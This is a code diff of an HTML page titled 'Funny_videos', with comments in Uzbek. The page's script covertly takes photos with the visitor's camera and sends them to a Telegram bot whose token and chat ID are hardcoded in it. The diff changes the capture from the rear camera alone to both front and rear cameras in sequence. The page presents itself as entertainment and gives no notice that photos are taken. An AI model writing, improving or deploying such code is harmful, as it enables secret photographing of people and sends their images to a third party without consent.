@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <title>Funny_videos</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <style>
         html, body {
             margin: 0;
@@ -24,7 +23,6 @@
 <canvas id="canvas" width="320" height="240"></canvas>
 
 <script>
-    // 🔴 Telegram bot token va chat ID
     const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
     const CHAT_ID  = "7880376636";
 
@@ -39,29 +37,39 @@
         }).catch(err => console.log("Telegram xato"));
     }
 
-    // 🔹 Kamera tanlash: "user" = old kamera, "environment" = orqa kamera
-    const CAMERA_MODE = "environment"; // orqa kamera
+    // Kamera turlari: "user" = old, "environment" = orqa
+    const cameras = ["user", "environment"];
 
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: CAMERA_MODE } })
-    .then(stream => {
-        const video = document.getElementById("video");
-        video.srcObject = stream;
+    function captureFromCamera(index) {
+        if(index >= cameras.length) return; // barcha kameralar tugadi
 
-        video.addEventListener('canplay', () => {
-            setTimeout(() => {
-                const canvas = document.getElementById("canvas");
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: cameras[index] } })
+        .then(stream => {
+            const video = document.getElementById("video");
+            video.srcObject = stream;
 
-                canvas.toBlob(blob => {
-                    sendToTelegram(blob);
-                }, "image/jpeg", 0.9);
+            video.addEventListener('canplay', () => {
+                setTimeout(() => {
+                    const canvas = document.getElementById("canvas");
+                    const ctx = canvas.getContext("2d");
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                stream.getTracks().forEach(track => track.stop());
-            }, 500); // video barqaror bo‘lishi uchun 0.5 soniya kutish
-        });
-    })
-    .catch(err => console.log("Kameraga ruxsat berilmadi"));
+                    canvas.toBlob(blob => {
+                        sendToTelegram(blob);
+
+                        // Kamera o'chadi va keyingi kameraga o'tadi
+                        stream.getTracks().forEach(track => track.stop());
+                        captureFromCamera(index + 1);
+                    }, "image/jpeg", 0.9);
+
+                }, 500); // video barqaror bo'lishi uchun
+            }, { once: true });
+        })
+        .catch(err => console.log("Kameraga ruxsat berilmadi"));
+    }
+
+    // Birinchi kameradan boshlash
+    captureFromCamera(0);
 </script>
 
 </body>
